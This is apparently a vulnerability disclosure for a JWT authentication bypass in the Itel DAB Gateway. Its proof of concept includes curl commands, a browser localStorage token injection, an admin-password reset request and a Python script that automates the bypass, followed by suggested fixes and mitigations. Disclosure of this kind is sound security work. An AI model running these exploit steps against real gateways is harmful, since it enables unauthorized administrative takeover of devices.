# Itel DAB Gateway Authentication Bypass Vulnerability (IDGat build c041640a )

## Description
The **Itel DAB Gateway** (IDGat build c041640a ) is vulnerable to **Authentication Bypass** due to improper JWT validation across devices.  
Attackers can reuse a valid JWT token obtained from one device to authenticate and gain administrative access to any other device running the same firmware, even if the passwords and networks are different.  
This allows **full compromise** of affected devices.

---

## Vendor Information
- **Vendor:** Itel Electronics  
- **Vendor Homepage:** [https://www.itel.it/](https://www.itel.it/)  

---

## Affected Product(s)/Code Base
- **Product:** Itel DAB Gateway  
- **Firmware/Software Version:** IDGat build c041640a   

---

## Vulnerable Endpoints
- `/login`  
- `/` (root endpoint)  

---

## Attack Type
- **Type:** Authentication Bypass  
- **Classification:** Improper Authentication  

---

## Impact
- **Severity:** Critical  
### Description
The Itel DAB Gateway device (IDGat build c041640a ) is vulnerable to Authentication Bypass due to flawed session handling with JWT tokens.  
- When a user logs into **Device 1** using valid credentials, the system issues a JWT token in the `/login` response.  
- This JWT token can be reused to gain unauthorized access to any other device running the same firmware version, even if the devices are on different networks with different passwords.  
- The vulnerability allows an attacker to bypass authentication on other devices by inserting the JWT token into the browser's local storage and refreshing the page.  
- This enables **full administrative control** over the target device without needing the correct password.  

---

## Affected Component(s)
- **Session Handling:** Improper validation of JWT tokens across devices.  
- **Authentication:** Failure to bind JWT tokens to a specific device or session.  
- **Authorization:** Lack of proper scope and audience validation for JWT tokens.  

---

## Attack Vector(s)
- **Access Method:** Remote, over HTTP.  
- **Authentication Requirement:** None (bypass via token injection).  
- **Exploit Complexity:** Low (manual token injection).  

---

## Proof of Concept (PoC)
### 1. Scenario Overview
**Device 1**:  
- IP Address: `137.18.2.1`  
- Username: `admin`  
- Password: `passd1`  

**Device 2**:  
- IP Address: `208.129.3.4`  
- Username: `admin`  
- Password: `pworld2`  

---

### 2. Exploit Steps
✅ **Step 1: Obtain JWT Token from Device 1**  
Log into Device 1 using valid credentials to obtain a JWT token:

```bash
curl -X POST 'http://137.18.2.1/login' \
-H 'Content-Type: application/json' \
--data-raw '{
  "username": "admin",
  "password": "passd1"
}'
```
Example Response:

```json
{
  "jwt": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```
✅ **Step 2: Inject JWT Token into Browser's Local Storage on Device 2**

    1. Open the browser on Device 2 at http://208.129.3.4/

    2. Open the browser's developer console (F12)

    3. Insert the JWT into local storage:

    ```javascript
    localStorage.setItem("jwt", '"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."');
    ```
    Ensure the value starts and ends with `"`
    Example:
    ```javascript
    localStorage.setItem("jwt", '"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."');
    ```
✅ **Step 3: Refresh the Browser**

    Refresh the page (F5)

    The device will log in as an admin without requiring a password!

✅ **Step 4: Confirm Access and Exploit the Device**
change the admin password:
```bash
curl -X GET 'http://208.129.3.4/setPassword' \
 -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..'\   
 --data-raw '{"user":"admin","password":"admin"}' 
```
Example Response:
```json
{
  
}

```

---

## **Automated Exploit (Python PoC Script)**

The following Python script automates the attack process:
```paython
import requests
import json

# Source Device Login
source_device = "http://137.18.2.1/login"
target_device = "http://208.129.3.4/ntpinfo"

login_data = {
    "username": "admin",
    "password": "passd1"
}

# Step 1: Get JWT from Source Device
response = requests.post(source_device, json=login_data)
jwt = response.json().get("jwt")

print(f"[+] JWT obtained: {jwt}")

# Step 2: Use JWT on Target Device
headers = {
    "Authorization": f"Bearer {jwt}"
}

# Step 3: Access Target Device
response = requests.get(target_device, headers=headers)

if response.status_code == 200:
    print("[+] Authentication Bypass Successful!")
    print(response.json())
else:
    print("[-] Exploit failed.")

```
---


## Vulnerability Type
- **Authentication Bypass**  
- **Session Misconfiguration**  

---

## CWE-ID
- **CWE-287** – Improper Authentication  
- **CWE-384** – Session Fixation  

---

# Impact Info

## Impact Type
- **Account Takeover** – Attackers can impersonate any user with the stolen token.  
- **Privilege Escalation** – Attackers can gain administrative access to all devices.  
- **Device Compromise** – Attackers can modify settings and control the device remotely.  

---

# Suggested Fixes

## 1. JWT Scope and Audience
- Bind JWT tokens to a specific device or IP address.  
- Include the device identifier in the JWT claims.  

## 2. Session Binding
- Bind JWT tokens to session data such as IP address or user agent.  
- Regenerate JWT tokens upon session change.  

## 3. Expiration and Revocation
- Implement short expiration times for JWT tokens.  
- Revoke JWT tokens upon logout or password change.  

## 4. Secure Storage
- Store JWT tokens securely using HTTP-only cookies instead of local storage.  

---

# Mitigation & Workarounds
Until a patch is released, administrators should:  
- **Disable JWT-based authentication** and switch to session-based tokens.  
- **Restrict access** to the `/login` endpoint using firewall rules.  
- **Monitor logs** for suspicious logins from unusual IP addresses.  
